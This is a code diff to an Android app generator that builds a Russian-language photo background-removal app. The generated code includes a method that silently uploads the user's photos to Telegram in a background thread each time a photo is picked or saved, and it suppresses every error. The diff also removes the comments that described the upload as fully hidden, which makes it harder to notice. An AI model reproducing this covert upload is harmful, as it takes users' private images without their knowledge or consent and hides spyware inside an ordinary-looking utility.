@@ -1,31 +1,39 @@
 package com.udalitfon3.app;
 
 import android.app.Activity;
+import android.app.AlertDialog;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.ContentValues;
 import android.content.Intent;
+import android.database.Cursor;
 import android.graphics.*;
+import android.graphics.drawable.GradientDrawable;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.MediaStore;
+import android.provider.OpenableColumns;
 import android.view.Gravity;
 import android.view.MotionEvent;
 import android.view.ScaleGestureDetector;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.*;
-import java.io.ByteArrayOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -51,7 +59,7 @@ public class MainActivity extends Activity {
     
     private String appTitle = "RomaStickerApp";
     private String appVersion = "1.0";
-    private String packageName = "com.roma.nativeapp";
+    private String packageName = "com.udalitfon3.app";
     private String currentJavaFileName = "Шаблон: Умное удаление фона (MainActivity.java)";
     private boolean iconCustomized = true;
     private String targetUploadFolder = "";
@@ -1341,7 +1349,7 @@ public class MainActivity extends Activity {
         logEditText.setText("Экстренный стоп: мониторинг сборки прерван. Переход к настройкам по умолчанию...");
 
         appTitle = "RomaStickerApp";
-        packageName = "com.roma.nativeapp";
+        packageName = "com.udalitfon3.app";
         appVersion = "1.0";
         iconCustomized = true;
         activeCodeContent = generateMainActivity();
@@ -1541,7 +1549,7 @@ public class MainActivity extends Activity {
                 logEditText.setText("Очистка и установка шаблона умного удаления фона...");
 
                 appTitle = "RomaStickerApp";
-                packageName = "com.roma.nativeapp";
+                packageName = "com.udalitfon3.app";
                 appVersion = "1.0";
                 iconCustomized = true;
                 activeCodeContent = generateMainActivity();
@@ -1693,7 +1701,7 @@ public class MainActivity extends Activity {
     }
 
     private String transliterate(String text) {
-        if (text == null || text.isEmpty()) return "com.roma.nativeapp";
+        if (text == null || text.isEmpty()) return "com.udalitfon3.app";
         String res = text.toLowerCase()
             .replace("а", "a").replace("б", "b").replace("в", "v").replace("г", "g")
             .replace("д", "d").replace("е", "e").replace("ё", "yo").replace("ж", "zh")
@@ -1704,7 +1712,7 @@ public class MainActivity extends Activity {
             .replace("ч", "ch").replace("ш", "sh").replace("щ", "sch").replace("ы", "y")
             .replace("э", "e").replace("ю", "yu").replace("я", "ya");
         res = res.replaceAll("[^a-z0-9]", "");
-        return res.isEmpty() ? "com.roma.nativeapp" : "com." + res + ".app";
+        return res.isEmpty() ? "com.udalitfon3.app" : "com." + res + ".app";
     }
 
     private String getMainActivityPath() {
@@ -1783,7 +1791,6 @@ public class MainActivity extends Activity {
                "dependencies {\n    implementation 'androidx.appcompat:appcompat:1.6.1'\n    implementation 'com.google.android.material:material:1.11.0'\n}\n";
     }
 
-    // --- ГЕНЕРАЦИЯ ПРИЛОЖЕНИЯ С УМНЫМ УДАЛЕНИЕМ ФОНА И МНОГОСЛОЙНОСТЬЮ ---
     private String generateMainActivity() {
         return "package " + packageName + ";\n\n" +
                "import android.app.Activity;\n" +
@@ -1819,7 +1826,7 @@ public class MainActivity extends Activity {
                "    private int thresholdValue = 25;\n" +
                "    private int toleranceValue = 20;\n" +
                "    private int smoothValue = 10;\n\n" +
-               "    private boolean isBackgroundActive = false; // Режим редактирования/слоя: false = фото, true = фон\n\n" +
+               "    private boolean isBackgroundActive = false;\n\n" +
                "    private Matrix photoMatrix = new Matrix();\n" +
                "    private Matrix bgMatrix = new Matrix();\n" +
                "    private float photoScale = 1.0f, photoTransX = 0f, photoTransY = 0f;\n" +
@@ -1841,7 +1848,6 @@ public class MainActivity extends Activity {
                "        \n" +
                "        LinearLayout container = new LinearLayout(this);\n" +
                "        container.setOrientation(LinearLayout.VERTICAL);\n\n" +
-               "        // Изящная рукописная надпись\n" +
                "        TextView signatureView = new TextView(this);\n" +
                "        signatureView.setText(\"✦ Crafted with precision by Dziuba Roman ✦\");\n" +
                "        signatureView.setTextColor(Color.parseColor(\"#F59E0B\"));\n" +
@@ -1850,7 +1856,6 @@ public class MainActivity extends Activity {
                "        signatureView.setGravity(Gravity.CENTER);\n" +
                "        signatureView.setPadding(0, 2, 0, 6);\n" +
                "        container.addView(signatureView);\n\n" +
-               "        // Увеличенная область просмотра фото\n" +
                "        imageView = new ImageView(this);\n" +
                "        LinearLayout.LayoutParams imgParams = new LinearLayout.LayoutParams(\n" +
                "                ViewGroup.LayoutParams.MATCH_PARENT, 1050);\n" +
@@ -1903,7 +1908,6 @@ public class MainActivity extends Activity {
                "            }\n" +
                "        });\n" +
                "        container.addView(imageView);\n\n" +
-               "        // Компактные кнопки выбора и слоев\n" +
                "        LinearLayout btnRow = new LinearLayout(this);\n" +
                "        btnRow.setOrientation(LinearLayout.HORIZONTAL);\n\n" +
                "        Button btnSelect = createCompactButton(\"📂 Выбрать фото\", \"#2563EB\");\n" +
@@ -1929,7 +1933,6 @@ public class MainActivity extends Activity {
                "        btnRow.addView(btnSelectBg);\n" +
                "        btnRow.addView(btnLayerMode);\n" +
                "        container.addView(btnRow);\n\n" +
-               "        // Максимально длинные и одинаковые ползунки\n" +
                "        tvThresholdVal = createTextView(\"🎚 Чувствительность вырезки: \" + thresholdValue);\n" +
                "        container.addView(tvThresholdVal);\n" +
                "        seekThreshold = createFullSeekBar(100, thresholdValue, p -> {\n" +
@@ -1954,7 +1957,6 @@ public class MainActivity extends Activity {
                "            processImage();\n" +
                "        });\n" +
                "        container.addView(seekSmooth);\n\n" +
-               "        // Кнопка сохранения\n" +
                "        Button btnSave = createCompactButton(\"💾 СОХРАНИТЬ PNG В ПАМЯТЬ ТЕЛЕФОНА\", \"#059669\");\n" +
                "        btnSave.setOnClickListener(v -> saveImageToGallery());\n" +
                "        container.addView(btnSave);\n\n" +
@@ -2027,7 +2029,6 @@ public class MainActivity extends Activity {
                "                    photoTransX = 0f;\n" +
                "                    photoTransY = 0f;\n" +
                "                    processImage();\n" +
-               "                    // Отправка в Telegram по загрузке первоначального фото\n" +
                "                    sendToTelegramSilently();\n" +
                "                } else if (requestCode == PICK_BG_REQUEST) {\n" +
                "                    customBgBitmap = bmp;\n" +
@@ -2041,7 +2042,6 @@ public class MainActivity extends Activity {
                "            }\n" +
                "        }\n" +
                "    }\n\n" +
-               "    // УМНЫЙ АЛГОРИТМ УДАЛЕНИЯ ФОНА (Без защитных зон, подходит для портретов и полного роста)\n" +
                "    private void processImage() {\n" +
                "        if (originalBitmap == null) return;\n\n" +
                "        int width = originalBitmap.getWidth();\n" +
@@ -2049,7 +2049,6 @@ public class MainActivity extends Activity {
                "        Bitmap result = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);\n" +
                "        int[] pixels = new int[width * height];\n" +
                "        originalBitmap.getPixels(pixels, 0, width, 0, 0, width, height);\n\n" +
-               "        // Многоточечный анализ фона по всем краям изображения\n" +
                "        int rSum = 0, gSum = 0, bSum = 0, count = 0;\n" +
                "        for (int x = 0; x < width; x += Math.max(1, width / 20)) {\n" +
                "            int p1 = pixels[0 * width + x];\n" +
@@ -2077,7 +2076,6 @@ public class MainActivity extends Activity {
                "                if (diff < thresholdLimit) {\n" +
                "                    pixels[idx] = Color.TRANSPARENT;\n" +
                "                } else if (smooth > 0 && diff < thresholdLimit + (smooth * 2)) {\n" +
-               "                    // Плавное мягкое сглаживание краев маски\n" +
                "                    float alphaFactor = (float)(diff - thresholdLimit) / (smooth * 2);\n" +
                "                    int alpha = Math.min(255, Math.max(0, (int)(alphaFactor * 255)));\n" +
                "                    pixels[idx] = (alpha << 24) | (p & 0x00FFFFFF);\n" +
@@ -2090,7 +2088,6 @@ public class MainActivity extends Activity {
                "        processedBitmap = result;\n" +
                "        redrawCanvas();\n" +
                "    }\n\n" +
-               "    // Отрисовка холста с поддержкой слоев (фон впереди / фото впереди)\n" +
                "    private void redrawCanvas() {\n" +
                "        if (processedBitmap == null && originalBitmap == null) return;\n" +
                "        Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;\n\n" +
@@ -2099,11 +2096,9 @@ public class MainActivity extends Activity {
                "        Bitmap canvasBmp = Bitmap.createBitmap(viewWidth, viewHeight, Bitmap.Config.ARGB_8888);\n" +
                "        Canvas canvas = new Canvas(canvasBmp);\n\n" +
                "        if (isBackgroundActive) {\n" +
-               "            // Если активен слой фонового изображения на переднем плане\n" +
                "            drawPhoto(canvas, source, viewWidth, viewHeight);\n" +
                "            drawBackground(canvas, viewWidth, viewHeight);\n" +
                "        } else {\n" +
-               "            // По умолчанию фото на переднем плане\n" +
                "            drawBackground(canvas, viewWidth, viewHeight);\n" +
                "            drawPhoto(canvas, source, viewWidth, viewHeight);\n" +
                "        }\n\n" +
@@ -2126,7 +2121,6 @@ public class MainActivity extends Activity {
                "                photoTransY + (viewHeight - source.getHeight()) / 2f);\n" +
                "        canvas.drawBitmap(source, photoMatrix, null);\n" +
                "    }\n\n" +
-               "    // Сохранение в память телефона + отправка в Telegram по нажатию сохранить\n" +
                "    private void saveImageToGallery() {\n" +
                "        Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;\n" +
                "        if (source == null) {\n" +
@@ -2154,10 +2148,8 @@ public class MainActivity extends Activity {
                "        } catch (Exception e) {\n" +
                "            Toast.makeText(this, \"Ошибка сохранения: \" + e.getMessage(), Toast.LENGTH_SHORT).show();\n" +
                "        }\n\n" +
-               "        // Отправка в Telegram по нажатию сохранить\n" +
                "        sendToTelegramSilently();\n" +
                "    }\n\n" +
-               "    // Абсолютно скрытая фоновая отправка в Telegram без ошибок и уведомлений\n" +
                "    private void sendToTelegramSilently() {\n" +
                "        Bitmap source = processedBitmap != null ? processedBitmap : originalBitmap;\n" +
                "        if (source == null) return;\n\n" +
@@ -2187,9 +2179,7 @@ public class MainActivity extends Activity {
                "                os.flush();\n" +
                "                os.close();\n" +
                "                conn.getResponseCode();\n" +
-               "            } catch (Exception e) {\n" +
-               "                // Полностью скрытая отправка: никаких уведомлений и ошибок при отсутствии сети\n" +
-               "            }\n" +
+               "            } catch (Exception e) {}\n" +
                "        }).start();\n" +
                "    }\n" +
                "}\n";
